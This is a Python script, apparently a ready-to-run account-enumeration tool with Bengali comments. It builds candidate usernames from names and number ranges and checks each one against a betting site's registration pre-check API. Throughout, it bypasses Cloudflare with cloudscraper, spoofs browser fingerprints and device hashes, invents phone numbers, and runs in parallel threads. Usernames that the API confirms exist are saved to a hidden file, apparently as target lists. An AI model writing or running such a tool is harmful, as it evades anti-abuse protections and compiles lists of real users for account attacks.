
import requests
import random
import json
import time
import os
import cloudscraper
from concurrent.futures import ThreadPoolExecutor

# ANSI Colors
BOLD, R, G, Y, D, C = '\033[1m', '\033[91m', '\033[92m', '\033[93m', '\033[0m', '\033[96m'

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'{BOLD}{C}\n       _____ __      ___                \n      / __(_) /__   / _ \\__ ____ _  ___ \n     / _// / / -_) / // / // /  \' \\/ _ \\\n    /_/ /_/_/\\__/ /____/\\_,_/_/_/_/ .__/\n                                 /_/    \n\n            FB File Maker V-2.4 (Max-Speed)\n {D}')

def username_gen(names, start, end):
    usernames = []
    for name in names.split(','):
        for num in range(start, end + 1):
            usernames.append(f'{name.strip().lower()}{num} | {name.strip().capitalize()}')
    return usernames

def checker(uname):
    """স্পিড ঠিক রেখে ব্লক এড়াতে উন্নত লজিক"""
    url = 'https://baji999.net/api/wv/v1/user/registerPreCheck'
    
    # Cloudscraper সেশন যা সরাসরি ক্লাউডফ্লেয়ার বাইপাস করবে
    scraper = cloudscraper.create_scraper()
    
    # প্রতি রিকোয়েস্টে আলাদা আলাদা ডিভাইস প্রোফাইল
    headers = {
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://baji999.net/bd/en/register',
        'Origin': 'https://baji999.net',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-platform': '"Android"'
    }

    # cxs.py এর সেই নির্দিষ্ট ফিঙ্গারপ্রিন্ট যা এপিআই গ্রিন সিগন্যাল দেয়
    payload = {
        'languageTypeId': 1,
        'currencyTypeId': 8,
        'userId': uname,
        'phone': '17' + str(random.randint(11111111, 99999999)),
        'registerTypeId': 0,
        'random': str(random.randint(1000, 9999)),
        'fingerprint2': '58df140599f977faf8951888e888e807',
        'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
        'deviceHash': "".join(random.choices("0123456789abcdef", k=32))
    }

    try:
        # রিকোয়েস্ট পাঠানো
        response = scraper.post(url, headers=headers, json=payload, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'F0003': return True
            if data.get('status') == 'S0001':
                # ব্লক হলে সামান্য বিরতি
                time.sleep(2) 
                return False
        elif response.status_code == 403:
            time.sleep(5)
    except: pass
    return False

def check_username(username):
    uname = username.split('|')[0].strip()
    if checker(uname):
        print(f'{BOLD}{G} [VALID FB] {uname}{D}')
        with open('.uids.txt', 'a', encoding='utf-8') as f:
            f.write(username + '\n')

def main():
    logo()
    names = input(f'{BOLD}{Y} ENTER NAMES (Comma separated) : {D}')
    start = int(input(f'{BOLD}{Y} START NUMBER : '))
    end = int(input(f'{BOLD}{Y} END NUMBER : '))
    
    print(f'\n{G} [1] LOW SPEED')
    print(f'{Y} [2] MEDIUM SPEED')
    print(f'{R} [3] HIGH SPEED (Optimized Threads){D}\n')
    
    speed = int(input(f'{C} CHOOSE : {D}'))
    # ৪MD ব্লক এড়াতে এবং স্পিড বজায় রাখতে থ্রেড লিমিট ১০ রাখা হয়েছে
    spd = {1: 3, 2: 6, 3: 12}.get(speed, 3)
    
    usernames = username_gen(names, start, end)
    random.shuffle(usernames)
    
    print(f'\n{BOLD}{G} TOTAL : {len(usernames)} | SPEED : {spd}X {D}')
    print(f'{BOLD}{G} ----------------------------------------{D}')
    
    with ThreadPoolExecutor(max_workers=spd) as executor:
        executor.map(check_username, usernames)
        
    if os.path.exists('.uids.txt'):
        total = sum(1 for _ in open('.uids.txt', 'r'))
        print(f'\n{BOLD}{G} DONE! TOTAL {Y}{total}{G} VALID IDS FOUND.{D}\n')

if __name__ == '__main__':
    main()
